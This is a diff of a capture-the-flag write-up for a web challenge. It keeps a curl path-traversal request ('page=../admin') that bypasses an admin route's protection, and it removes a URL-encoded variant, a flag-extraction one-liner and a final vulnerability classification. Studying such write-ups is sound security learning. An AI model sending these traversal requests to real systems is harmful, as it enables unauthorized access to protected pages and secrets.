@@ -146,18 +146,6 @@ Equivalent curl command:
 curl -ks "https://<redacted-host>/routers/pages?page=../admin"
 ```
 
-URL-encoded variant:
-
-```bash
-curl -ks "https://<redacted-host>/routers/pages?page=..%2Fadmin"
-```
-
-To extract only the token:
-
-```bash
-curl -ks "https://<redacted-host>/routers/pages?page=../admin" | grep -o 'WEBVERSE{[^}]*}'
-```
-
 The direct `/admin` route was protected, but loading the same admin template through the page router bypassed that protection.
 
 ---
@@ -252,11 +240,3 @@ The app looked like an SSRF challenge because it used gateway-style routers and 
 
 The final bug was therefore **path traversal leading to access control bypass**, not SSRF.
 
----
-
-## Final Classification
-
-- **Vulnerability:** Path Traversal
-- **Impact:** Access Control Bypass / Sensitive Token Disclosure
-- **OWASP Top 10:2025:** A01 - Broken Access Control
-- **Severity:** High
